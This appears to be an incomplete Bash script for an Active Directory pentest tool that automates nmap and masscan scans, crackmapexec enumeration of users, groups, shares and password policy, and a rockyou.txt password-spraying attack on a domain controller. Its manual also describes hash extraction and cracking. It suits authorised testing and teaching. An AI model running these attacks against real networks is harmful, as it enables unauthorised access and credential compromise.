#!/bin/bash



red="\e[31m"                            #Setting up color variables to colorize the script and the figlet
green="\e[32m"
yellow="\e[33m"
blue="\e[34m"
magenta="\e[35m"
cyan="\e[36m"
lcyan="\e[96m"
lgreen="\e[92m"
lblue="\e[94m"

endcolor="\e[0m"                        #End of color variable effect


ts=$(date +%a_%b.%d_%Y_%H:%M:%S)        #Setting up a date & time variable for folder documentation


function privileges (){                 #Function examines root privliges by testing the user's group. If the group is not 0 - User gets a prompt and script terminates in order for the user to restart as root.
if [[ $(id -u) -ne 0 ]]; then
                echo -e "$red[!] WARNING!!! \n[!] This script must run with root privileges. \n[*] Please restart the script under root. \n[*] Terminating script... $endcolor"
                exit 1
fi
}

privileges

function manual(){		#User manual function the user can navigate to from the main menu and from the various stages.
printf $magenta
figlet -f digital Help Manual
printf $endcolor

echo -e "\nThis tool was designed with the aim of scanning networks for endpoints, with emphasis on locating the Active Directory Domain Controller.\n"
echo -e "Once in the main menu, you are given a choice between $lcyan[1]$endcolor (scanning), $lgreen[2]$endcolor (enumeration) and $lblue[3]$endcolor (exploitation).\nThere is also a key feature - $cyan[V]$endcolor (variables). Some of the enumeration and exploitation options require pre-supplied variables in order to work, so make sure to fully utilize it if you can."
echo -e "Inside $cyan[V]ariables$endcolor, you are able to supply the Active Directory domain name, credentials (username, password), a password list and the Domain Controller IP address for certain exploitation features.\nThe main menu will display the user inputs for convenience.\nSetting up an output folder when starting the script is$red mandatory$endcolor before using any of the features."
echo -e "\n$yellow[1] SCANNING:$endcolor\n"
echo -e "$blue[B]asic$endcolor scanning: Nmap scans the network with -Pn flag to bypass the discovery phase."
echo -e "$green[I]ntermediate$endcolor scanning: Performs a full TCP port range nmap scan the network with -Pn flag."    
echo -e "$red[A]dvanced$endcolor scanning: Performs a full TCP port range nmap scan the network with -Pn flag, and adds a full range UDP port masscan for a complete port scan."
echo -e "\n$yellow[2] ENUMERATION:$endcolor\n"
echo -e "$blue[B]asic$endcolor enumeration: Does a service nmap scan (-sV) on the network in order to locate key ports and services and find the Domain Controller and DHCP server. If a Domain Controller is found - it will be registered as a variable (if you find more than one Domain Controller in your network and wish to use a different Domain Controller IP, please change in manually inside $cyan[V]ariables$endcolor)."
echo -e "$green[I]ntermediate$endcolor enumeration: Nmap scans the Domain Controller with 3 scripts (smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-users.nse), and performs a shared folder enumeration on the Domain Controller $red(requires credentials)$endcolor."
echo -e "If the Domain Controller was located in a $blue[B]asic$endcolor enumeration, its IP address will be used as the target. If a $blue[B]asic$endcolor enumeration hasn't been used - the user must type in a target IP."
echo -e "$red[A]dvanced$endcolor enumeration: Extracts users, groups, shares, password policy, finds disabled accounts, never-expired accounts and members of the Domain Admin group $red(requires credentials)$endcolor."
echo -e "\n$yellow[3] EXPLOITATION:$endcolor\n"
echo -e "$blue[B]asic$endcolor exploitation: Performs an nmap scan on the network, while running the vulnerability script in order to detect vulnerabilities for possible exploitation."
echo -e "$green[I]ntermediate$endcolor exploitation: Executes a Password Spray attack on the Domain Controller. Either uses a user given password list, or rockyou.txt if a password list is not supplied $red(requires credentials)$endcolor."
echo -e "$red[A]dvanced$endcolor exploitation: Attempts to extract and crack password hashes by using impacket's secretsdump.py to extract the ticket, and John the Ripper to crack it with the user-provided password list $red(requires credentials)$endcolor."

echo -e "\n\n$cyan[*]$endcolor$yellow Please press $green[Enter]$endcolor$yellow to return to the main menu...$endcolor\n"
read n
clear ; sleep 0.3 ; menu
}




function validrange(){                  #this function tests the validity of the network range in every stage of the script when the user is asked to provide
cd $folder.$ts
nmap $target  -sL 2> .err 1> .scan
        if [ ! -z "$(cat .err)" ]       
                then
                rm .err
                echo -e "$red[!] Network range invalid. Please restart the function and try again.$endcolor \n\n$cyan[*]$endcolor$yellow Returnnig to main menu...$endcolor\n"
                cd ..
		sleep 2 ; clear ; menu
                else
                rm .err
                echo -e "\n$green[!] Network range is valid $endcolor\n"
		sleep 0.3
	fi
cd ..
}
function fig (){		#Figlet function for aesthetics with the script name
printf $lgreen
figlet AD Enum
printf $endcolor
read -p "$(echo -e "\n$cyan[?]$endcolor$yellow Please set the name of the output folder: $endcolor")" folder         
mkdir $folder.$ts >/dev/null
if ! command -v enscript &> /dev/null ; then echo -e "$red[!]$endcolor$yellow enscript was not found on host machine. Installing...$endcolor" ; apt install enscript -y &> /dev/null ; clear ; menu ; else sleep 0.3 ; clear ; menu ; fi

}


function settings (){		#Credential function for the user to add. Lets the user see the input they provide, and let the user know when no variable has been provided
sleep 0.3
read -p "$(echo -e "\n$cyan[?]$endcolor$yellow Please enter an Active Directory domain name: $endcolor")" domain
        if [ ! -z $domain ] 
                then echo -e "$green[!] Domain name registered ($blue$domain$endcolor$green) $endcolor" ; sleep 0.3
                else echo -e "$red[!] A domain name was not provided $endcolor" ; sleep 0.3
        fi


read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter an Active Directory username credential: $endcolor")" adusr
        if [ ! -z $adusr ] 
                then echo -e "$green[!] Credential username registered ($blue$adusr$endcolor$green) $endcolor" ; sleep 0.3
                else echo -e "$red[!] A credential username was not provided $endcolor" ; sleep 0.3
        fi

read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter an Active Directory password credential: $endcolor")" adpw
        if [ ! -z $adpw ] 
                then echo -e "$green[!] Credential password registered ($blue$adpw$endcolor$green) $endcolor" ; sleep 0.3
                else echo -e "$red[!] A credential password was not provided $endcolor" ; sleep 0.3
        fi

read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a password list path: $endcolor")" list
	if [ -f $list ] && [ ! -z $list ] 
		then echo -e "$green[!] A password list has been submitted ($blue$list$endcolor$green) $endcolor" ; sleep 0.3
		else echo -e "$red[!] The path does not contain a file. $endcolor\n$blue[+] Resorting to rockyou.txt $endcolor" ; sleep 0.3
	fi
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller IP address: $endcolor")" dcip
        if [ ! -z $dcip ] 
                then echo -e "$green[!] A Domain Controller IP address has been submitted ($blue$dcip$endcolor$green) $endcolor\n" ; sleep 0.3
                else echo -e "$red[!] A Domain Controller IP address was not provided $endcolor\n" ; sleep 0.3
        fi


echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"

sleep 1 ; clear ; menu
}


function menu(){		#Main menu function. Uses case to allow the user to navigate between the various stages, the manual, variable insertion and allows exiting
printf $lgreen
figlet AD Enum
printf $endcolor
echo -e "$red[M] WELCOME TO THE MAIN MENU:$endcolor\n"
sleep 0.3
echo -e "$lcyan[1] DOMAIN SCANNING$endcolor\n$lgreen[2] DOMAIN ENUMERATION$endcolor\n$lblue[3] DOMAIN EXPLOITATION$endcolor\n\n$magenta[H] MANUAL$endcolor\n$cyan[V] VARIABLES$endcolor\n$red[E] EXIT$endcolor\n"
if [ -z $domain ]; then echo -e "\n$cyan[*]$endcolor$green Active Directory domain name:$endcolor$red N\A$endcolor" ; else echo -e "$cyan[*]$endcolor$green Active Directory domain name:$endcolor$blue $domain$endcolor" ; fi
if [ -z $adusr ]; then echo -e "$cyan[*]$endcolor$green Active Directory username credential:$endcolor$red N\A$endcolor" ; else echo -e "$cyan[*]$endcolor$green Active Directory username credential:$endcolor$blue $adusr$endcolor" ; fi
if [ -z $adpw ]; then echo -e "$cyan[*]$endcolor$green Active Directory password credential:$endcolor$red N\A$endcolor" ; else echo -e "$cyan[*]$endcolor$green Active Directory password credential:$endcolor$blue $adpw$endcolor" ; fi
if [ -z $list ]; then echo -e "$cyan[*]$endcolor$green Password list:$endcolor$red N\A$endcolor" ; else echo -e "$cyan[*]$endcolor$green Password list:$endcolor$blue $list$endcolor" ; fi
if [ -z $dcip ]; then echo -e "$cyan[*]$endcolor$green Domain Controller IP:$endcolor$red N\A$endcolor\n" ; else echo -e "$cyan[*]$endcolor$green Domain Controller IP:$endcolor$blue $dcip$endcolor\n" ; fi


read -p "$(echo -e "$cyan[?]$endcolor$yellow Please choose whether to $lcyan[1]$endcolor$yellow scan,$endcolor $lgreen[2]$endcolor$yellow enumerate or$endcolor $lblue[3]$endcolor$yellow exploit the target ($endcolor$magenta[H]elp$endcolor$yellow for manual,$endcolor$cyan[V]ariables$endcolor$yellow, $endcolor$red[E]xit$endcolor$yellow): $endcolor")" choice

case $choice in
1)	if [ -z $folder ]
		then
		echo -e "$red[!] An output folder has not been set up. Please set up a folder inside $cyan[V]ariables$endcolor$red.$endcolor" ; sleep 2 ; clear ; menu 
		else sleep 0.3 ; netscan
	fi
;;
2)	if [ -z $folder ]
                then
                echo -e "$red[!] An output folder has not been set up. Please set up a folder inside $cyan[V]ariables$endcolor$red.$endcolor" ; sleep 2 ; clear ; menu
                else sleep 0.3 ; netenum
        fi 
;;
3)	if [ -z $folder ]
                then
                echo -e "$red[!] An output folder has not been set up. Please set up a folder inside $cyan[V]ariables$endcolor$red.$endcolor" ; sleep 2 ; clear ; menu
                else sleep 0.3 ; netexploit
        fi 
;;
V) sleep 0.3 ; settings
;;
H) sleep 0.3 ; manual
;;
E) echo -e "\n$cyan[*]$endcolor$red Exiting...$endcolor" ; exit 1
;;
*) echo -e "$red[!] Invalid input! - Please choose $lcyan[1]$endcolor$red,$endcolor $lgreen[2]$endcolor$red or$endcolor $lblue[3]$endcolor" ; sleep 2 ; clear ; menu
;;
esac
}

function netscan(){			#Scanning function. Uses case to navigate between the various scanning types
echo -e "$lcyan[1] DOMAIN SCANNING: $endcolor\n"
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please select whether you would like to perform a$endcolor $blue[B]asic$endcolor$yellow,$endcolor $green[I]ntermediate$endcolor$yellow or an$endcolor $red[A]dvanced$endcolor$yellow scan$endcolor $yellow($endcolor$magenta[H]elp$endcolor$yellow for manual, $endcolor$red[M]ain menu$endcolor$yellow): $endcolor")" mode             #Prompt asks the user for the type of scan they wis>
sleep 0.3
case $mode in
B)
echo -e "$blue[*] [B]asic scan was selected $endcolor"
sleep 0.3
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a network as a scanning target: $endcolor")" target                                      
sleep 0.3
validrange 

echo -e "$cyan[*]$endcolor$blue Running scan on given IP range...$endcolor\n"
sleep 0.3

cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])

do
        
        echo -e "$yellow[+] Scannning $ip... $endcolor"
        nmap -Pn $ip -oN $ip > /dev/null             
	testtcp=$(cat $ip | grep -i "open")
        if [ -z $testtcp 2>/dev/null ]
                then  
                rm $ip					#removes files in which the nmap scan didn't find any open ports
                else  
                enscript $ip -p t_$ip 2>/dev/null
                ps2pdf t_$ip Basic_Scan_$ip.pdf 2>/dev/null

                rm t_$ip
                rm $ip
        fi
               
done
echo -e "$blue[+] Saving Data...$endcolor\n"
rm .scan
cd ..
sleep 2
echo -e "\n$cyan[*]$endcolor$yellow Scan complete! Returning to main menu...$endcolor\n"
sleep 2 ; clear ; menu



;;

I)
echo -e "$green[*] [I]ntermediate scan was selected $endcolor "
sleep 0.3
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a network as a scanning target: $endcolor")" target
sleep 0.3
validrange

echo -e "$cyan[*]$endcolor$blue Running scan on given IP range...$endcolor\n"
sleep 0.3
cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])

do
        
        echo -e "$yellow[+] Scannning $ip... $endcolor"
        nmap -Pn -p- $ip -oN $ip > /dev/null             
        testtcp=$(cat $ip | grep -i "open")
	if [ -z $testtcp 2>/dev/null ]
                then 
                rm $ip				#Removes files where the nmap scan didn't find any open ports
                else
        	enscript $ip -p t_$ip 2>/dev/null
        	ps2pdf t_$ip Intermediate_Scan_$ip.pdf 2>/dev/null

                rm t_$ip
                rm $ip
        fi


done
echo -e "$blue[+] Saving Data...$endcolor\n"
rm .scan
cd ..
sleep 2
echo -e "\n$cyan[*]$endcolor$yellow Scan complete! Returning to main menu...$endcolor\n"
sleep 2 ; clear ; menu

;;

A)
echo -e "$red[*] [A]dvanced scan was selected $endcolor "
sleep 0.3
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a network as a scanning target: $endcolor")" target
sleep 0.3 
validrange
 
echo -e "$cyan[*]$endcolor$blue Running scan on given IP range...$endcolor\n"
sleep 0.3
cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])

do
        
        echo -e "$yellow[+] Scannning $ip... $endcolor"
        nmap -Pn -p- $ip -sS -oN t_$ip  > /dev/null             
	masscan $ip -pU:1-65535 --rate=10000 -oG u_$ip 2> /dev/null
        testudp=$(cat u_$ip)
        if [ -z $testudp 2>/dev/null ]
                then
                rm u_$ip
                else
                cat u_$ip >> t_$ip 2>/dev/null			#Adds the udp massscan to the tcp scan
                rm u_$ip
        fi
        testtcp=$(cat t_$ip | grep -i "open")
	if [ -z $testtcp 2>/dev/null ]
		then 
		rm t_$ip
		else
		enscript t_$ip -p TCP_$ip 2>/dev/null
		ps2pdf TCP_$ip Advanced_Scan_$ip.pdf 2>/dev/null
		rm TCP_$ip
		rm t_$ip
	fi

        

done
echo -e "$blue[+] Saving Data...$endcolor\n"
rm .scan
cd ..
sleep 2
echo -e "\n$cyan[*]$endcolor$yellow Scan complete! Returning to main menu...$endcolor\n"
sleep 2 ; clear ; menu

;;

H)
echo -e "$magenta[!] Opening [H]elp manual. Press any key to return to the script: $endcolor\n"
manual
read n
sleep 0.3 ; clear ; menu 

;;
M) clear ; sleep 0.3 ; menu
;;
*)
echo -e "$red[!]Invalid input.$endcolor$yellow - Please choose between$endcolor $blue[B]$endcolor$yellow,$endcolor $green[I]$endcolor$yellow or$endcolor $red[A]$endcolor" ; netscan

;;
esac
}

function netenum(){		#Enumeration function. Uses case to navigate between the various enumeration stages
echo -e "$lgreen[2] DOMAIN ENUMERATION: $endcolor\n"

read -p "$(echo -e "$cyan[?]$endcolor$yellow Please select whether you would like to perform a$endcolor $blue[B]asic$endcolor$yellow,$endcolor $green[I]ntermediate$endcolor$yellow or an$endcolor $red[A]dvanced$endcolor$yellow enumeration$endcolor $yellow($endcolor$magenta[H]elp$endcolor$yellow for manual, $endcolor$red[M]ain menu$endcolor$yellow): $endcolor")" modeenum 

case $modeenum in

B)
echo -e "$blue[*] [B]asic enumeration was selected $endcolor"
sleep 0.3
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a network as a scanning target: $endcolor")" target
sleep 0.3
validrange 

echo -e "$cyan[*]$endcolor$blue Running scan on given IP range...$endcolor\n"
sleep 0.3

cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])

do
        
        echo -e "$yellow[+] Scannning $ip... $endcolor"
        nmap -Pn -sV $ip -oN $ip > /dev/null             
	nmap -sU -p 67 --script=dhcp-discover $ip | grep -i "open" 2> .err 1> .dhcpnmap ; rm .err	#Checks for open udp port 67 to find dhcp server
	dhcpaddr=$(cat .dhcpnmap)
                if [ -z $dhcpaddr 2> /dev/null ]
                        then
                        echo -e "$red[!] No DHCP server IP located! $endcolor"
                        rm .dhcpnmap
			rm $ip
			sleep 0.3
                        else
                        echo -e "$blue[+] DHCP server IP address found: $endcolor$yellow$ip$endcolor\n"
                        rm .dhcpnmap
			sleep 0.3
                fi
	dc=$(cat $ip 2> /dev/null | grep 'kerberos-sec\|ldap' | awk '{print $1,$3}' )		#Checks for kerberos/ldap ports to find the domain controller
	dcxip=$(cat $ip 2> /dev/null | grep 'kerberos-sec\|ldap' -nRw | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq)

		if [ ! -z "$dc" ]               
        		then 
        		echo -e "$green[!] Found open Kerberos/ldap ports:$endcolor\n$yellow$dc$endcolor\n$blue[+] Domain Controller IP address: $endcolor$yellow$dcxip $endcolor\n"

			enscript $ip -p base_$ip 2>/dev/null
                        ps2pdf base_$ip Basic_Enumeration_$ip.pdf 2>/dev/null
                        rm base_$ip
                        rm $ip
			dcip=$(echo $dcxip)
                
        		sleep 1
        		else
        		echo -e "$red[!] No open Kerberos/ldap ports found. Domain Controller was not located!$endcolor\n"

			sleep 0.3
		fi

done

sleep 2
rm .scan
cd ..
echo -e "$blue[+] Saving Data...$endcolor\n" ; sleep 0.3
echo -e "\n$cyan[*]$endcolor$yellow Scan complete! Returning to main menu...$endcolor\n"
sleep 2 ; clear ; menu

;;

I)
if [ -z $adusr ]			#If there is no user credential, the user gets prompted and taken back to the main menu
	then
	echo -e "$red[!] This enumeration level requires credentials. Please Enter a username file path in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
	sleep 0.3
	echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
	sleep 2 ; clear ; menu
	else
	echo -e "$green[*] [I]ntermediate enumeration was selected $endcolor\n"
	sleep 0.3
	if [ -z ${dcip+x} ]		#Checks if the domain controller variable contains a value. If it doesn't - the user needs to type in a target ip
		then 
		echo -e "$red[!] Domain Controller address not yet set!$endcolor"
		read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller address: $endcolor")" dcip
		
		if [[ $dcip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
  			then
			echo -e "$green[!] IP address is valid$endcolor"
			else
  			echo -e "$red[!] IP address is invalid! Returning to main menu$endcolor" ; clear ; sleep 0.5 ; menu
		fi
        	echo -e "\n$cyan[*]$endcolor$yellow Enumerating target network for key services...$endcolor\n"
		cd $folder.$ts
		
		enumserv=$(nmap -Pn -p- -sV --script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-users.nse $dcip -oN interenum | grep '21/tcp\|22/tcp\|139/tcp\|445/tcp\|5985/tcp\|5986/tcp\|389/tcp\|3389/tcp' )
        
                if [ -z $enumserv 2> /dev/null ]
                        then 
                        echo -e "\n$red[!] No open ports of vulnerable services found. Returning to main menu...$endcolor\n"
                        sleep 1
                        cd ..

                        sleep 2 ; clear ; menu
                        else 
                        echo -e "\n$green[!] Found ports of vulnderable services!$endcolor\n"
			echo -e "$yellow$(cat interenum | grep '21/tcp\|22/tcp\|139/tcp\|445/tcp\|5985/tcp\|5986/tcp\|389/tcp\|3389/tcp' 2> /dev/null )$endcolor"
			echo -e "$blue[+] Attempting shared folder enumeration...$endcolor"
			echo -e  "\n[*] Domain Controller shares:\n" >> interenum
			crackmapexec smb $dcip -u $adusr -p $adpw --shares >> interenum
			echo -e "$blue[+] Saving Data...$endcolor\n"
                        enscript interenum -p enum 2>/dev/null
                        ps2pdf enum Intermediate_Enumeration_$dcip.pdf 2>/dev/null
                        rm enum
                        rm interenum
			sleep 0.3

                        cd ..
			echo -e "\n$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
                        sleep 2 ; clear ; menu
                fi
			

		else
		echo -e "$cyan[*]$endcolor$yellow Enumerating target network for key services...$endcolor\n"
        	cd $folder.$ts
        	enumserv=$(nmap -Pn -p- -sV --script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-users.nse $dcip -oN interenum | grep '21/tcp\|22/tcp\|139/tcp\|445/tcp\|5985/tcp\|5986/tcp\|389/tcp\|3389/tcp' )
		
        
                	if [ -z $enumserv 2> /dev/null ]
                        	then 
                        	echo -e "\n$red[!] No open ports of vulnerable services found. Returning to main menu...$endcolor\n"
                        	sleep 1
                        	cd ..
        


                        	sleep 2 ; clear ; menu
                        	else 
                        	echo -e "\n$green[!] Found ports of vulnderable services!$endcolor\n"
                        	echo -e "$yellow$(cat interenum | grep '21/tcp\|22/tcp\|139/tcp\|445/tcp\|5985/tcp\|5986/tcp\|389/tcp\|3389/tcp' 2> /dev/null )$endcolor"
				echo -e "$blue[+] Attempting shared folder enumeration...$endcolor"
                        	echo -e  "\n[*] Domain Controller shares:\n" >> interenum
                        	crackmapexec smb $dcip -u $adusr -p $adpw --shares >> interenum
				echo -e "$blue[+] Saving Data...$endcolor\n"
                                enscript interenum -p enum 2>/dev/null
                        	ps2pdf enum Intermediate_Enumeration_$dcip.pdf 2>/dev/null
                        	rm enum  
                        	rm interenum
                        	sleep 0.3
                        	cd ..
                        	echo -e "\n$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
                        	sleep 2 ; clear ; menu
                	fi
	fi
fi


;;

A)
if [ -z $adusr ]
        then
        echo -e "$red[!] This enumeration level requires credentials. Please enter username credentials in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
        sleep 0.3
        echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
        sleep 2 ; clear ; menu
        else
        echo -e "$blue[*] Advanced enumeration was selected$endcolor"

        if [ -z $adpw ]
                then
                echo -e "$red[!] This enumeration level requires credentials. Please enter password credentials in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
        	sleep 0.3
        	echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
        	sleep 2 ; clear ; menu
		else
                cd ./$folder.$ts    
                	if [ -z ${dcip+x} ]
                        	then
                        	echo -e "$red[!] Domain Controller address not yet set!$endcolor"
                        	read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller address: $endcolor")" dcip
                		if [[ $dcip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]  
                        		then
                        		echo -e "$green[!] IP address is valid$endcolor"
                        		else
                        		echo -e "$red[!] IP address is invalid! Returning to main menu$endcolor" ; sleep 2 ; clear ; menu
                		fi

                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract users...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw --users > advenum		#Runs a separate crackmapexec command for every execution in order to have a different prompt for each execution
				sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract groups...$endcolor"
				crackmapexec smb $dcip -u $adusr -p $adpw --groups >> advenum
  				sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract shares...$endcolor"
				crackmapexec smb $dcip -u $adusr -p $adpw --shares >> advenum
				sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract password policy...$endcolor"
                       		crackmapexec smb $dcip -u $adusr -p $adpw --pass-pol >> advenum
				sleep 0.3
				echo -e "\n$cyan[+]$endcolor$blue Attempting to extract disabled accounts...$endcolor"
				crackmapexec smb $dcip -u $adusr -p $adpw -X 'Get-ADUser -Filter {(Enabled -eq $False)}' >> advenum
				sleep 0.3
				echo -e "\n$cyan[+]$endcolor$blue Attempting to extract accounts that never expire...$endcolor"
				crackmapexec smb $dcip -u $adusr -p $adpw -X 'Get-ADUser -Filter * -Properties Name, PasswordNeverExpires | Where { $_.PasswordNeverExpires -eq "true" } | Where {$_.enabled -eq "true"}' >> advenum
				sleep 0.3
				echo -e "\n$cyan[+]$endcolor$blue Attempting to extract members of the Administrator group...$endcolor"
				crackmapexec smb $dcip -u $adusr -p $adpw -X 'Get-ADGroupMember -Identity "Domain Admins"' >> advenum
				sleep 0.3
                        	echo -e "$blue[+] Saving Data...$endcolor\n"
                        	enscript advenum -p advanced 2>/dev/null
                        	ps2pdf advanced Advanced_Enumeration_$dcip.pdf 2>/dev/null
                        	rm advanced
                        	rm advenum
				cd ..
                        	sleep 0.3
                        	echo -e "$cyan[*]$endcolor$yellow Domain Controller enumeration concluded. Returning to main menu...$endcolor\n"
                        	sleep 2 ; clear ; menu
                        	else
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract users...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw --users > advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract groups...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw --groups >> advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract shares...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw --shares >> advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract password policy...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw --pass-pol >> advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract disabled accounts...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw -X 'Get-ADUser -Filter {(Enabled -eq $False)}' >> advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract accounts that never expire...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw -X 'get-aduser -filter * -properties Name, PasswordNeverExpires | where { $_.passwordNeverExpires -eq "true" } | where {$_.enabled -eq "true"}' >> advenum
                        	sleep 0.3
                        	echo -e "\n$cyan[+]$endcolor$blue Attempting to extract members of the Administrator group...$endcolor"
                        	crackmapexec smb $dcip -u $adusr -p $adpw -X 'Get-ADGroupMember -Identity "Domain Admins"' >> advenum
                        	sleep 0.3
                        	echo -e "$blue[+] Saving Data...$endcolor\n"
                        	enscript advenum -p advanced 2>/dev/null
                        	ps2pdf advanced Advanced_Enumeration_$dcip.pdf 2>/dev/null
                        	rm advanced
                        	rm advenum
                        	cd ..
				echo -e "$cyan[*]$endcolor$yellow Domain Controller enumeration concluded. Returning to main menu...$endcolor\n"
				sleep 2 ; clear ; menu
			fi
        fi
        
        
fi

;;

M) clear ; sleep 0.3 ; menu
;;
H) sleep 0.3 ; manual
;;
*) 
echo -e "$red[!]Invalid input.$endcolor$yellow - Please choose between$endcolor $blue[B]$endcolor$yellow,$endcolor $green[I]$endcolor$yellow or$endcolor $red[A]$endcolor" ; sleep 2 ; clear ; netenum
;;
esac
}

function netexploit(){			#Exploitation function. Uses case to navigate between the various exploitation stages
echo -e "$lblue[3] DOMAIN EXPLOITATION: $endcolor\n"

read -p "$(echo -e "$cyan[?]$endcolor$yellow Please select whether you would like to perform a$endcolor $blue[B]asic$endcolor$yellow,$endcolor $green[I]ntermediate$endcolor$yellow or an$endcolor $red[A]dvanced$endcolor$yellow exploitation$endcolor $yellow($endcolor$magenta[H]elp$endcolor$yellow for manual, $endcolor$red[M]ain menu$endcolor$yellow): $endcolor")" modeexploit

case $modeexploit in

B)
echo -e "$blue[*] [B]asic exploitation was selected $endcolor"
sleep 0.3
read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a network as a scanning target: $endcolor")" target                                      
sleep 0.3
validrange 

echo -e "$cyan[*]$endcolor$blue Running scan on given IP range...$endcolor\n"
sleep 0.3

cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])

do
        
        echo -e "$yellow[+] Scannning $ip... $endcolor"
        nmap -Pn -sV --script=vuln $ip -oN $ip > /dev/null
        testtcp=$(cat $ip | grep -i "open")
        if [ -z $testtcp 2>/dev/null ]
                then 
                rm $ip		#Removes files in which no open ports were found
                else
                enscript $ip -p t_$ip 2>/dev/null
                ps2pdf t_$ip Basic_Exploitation_$ip.pdf 2>/dev/null
                rm t_$ip
                rm $ip
	fi
        

done
echo -e "$blue[+] Saving Data...$endcolor\n"
rm .scan
cd ..

sleep 2
echo -e "\n$cyan[*]$endcolor$yellow Vulnderability scan complete. Returning to main menu$endcolor\n"
sleep 2 ; clear ; menu

;;

I)
if [ -z $adusr ]		#Checks if a user credential was given. Propmts the user and returns him to main menu if there's no user value
        then
        echo -e "$red[!] This exploitation level requires credentials. Please enter username credentials in the$endcolor $cyan[V]ariables$endcolor$red section.$endcolor\n"
        sleep 0.3
        echo -e "$cyan[*]$endcolor$yellow Returning to main menu...$endcolor\n"
        sleep 2 ; clear ; menu
	else
        echo -e "$green[*] Intermediate exploitation was selected$endcolor"

	if [ -z $list ]		#Checks if a password liar was given. Propmts the user and returns him to main menu if there's no password list value
		then
		
		cd ./$folder.$ts
		if [ -z ${dcip+x} ]		#Checks if a domain controller ip variable exists. If it doesn't - asks the user to give a target ip
			then
                	echo -e "$red[!] Domain Controller address not yet set!$endcolor"
                	read -p "$(echo -e "$cyan[?]$endcolor$yellow Please enter a Domain Controller address: $endcolor")" dcip
                		if [[ $dcip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]		#Checks if variable is a valid ip address. Taken from: https://stackoverflow.com/questions/13777387/check-for-ip-validity  
                        		then
                        		echo -e "$green[!] IP address is valid$endcolor"
                        		else
                        		echo -e "$red[!] IP address is invalid! Returning to main menu$endcolor" ; sleep 2 ; clear ; menu
                			fi
                	echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using rockyou.txt...$endcolor"
			cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz	#Rockyou.txt recovery to be used as the password list
			crackmapexec smb $dcip -u $adusr -p ./rockyou.txt --continue-on-success > spray
			rm ./rockyou.txt			#Rockyou.txt removed after attack is concluded
			echo -e "$blue[+] Saving Data...$endcolor\n"
	                enscript spray -p Inter_Spray 2>/dev/null
        	        ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
               	 	rm Inter_Spray
                	rm spray

			
			
			sleep 0.3
			else
                	echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using rockyou.txt...$endcolor"
			cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
                	crackmapexec smb $dcip -u $adusr -p ./rockyou.txt --continue-on-success > spray
			rm ./rockyou.txt
                	echo -e "$blue[+] Saving Data...$endcolor\n"
                        enscript spray -p Inter_Spray 2>/dev/null
                        ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
                        rm Inter_Spray
                        rm spray
			sleep 0.3
			cd..
			echo -e "$cyan[*]$endcolor$yellow Password spraying attack concluded. Returning to main menu...$endcolor\n"

		fi
		else
		cd $folder.$ts
    			if [ -z ${dcip+x} ];
                        	then
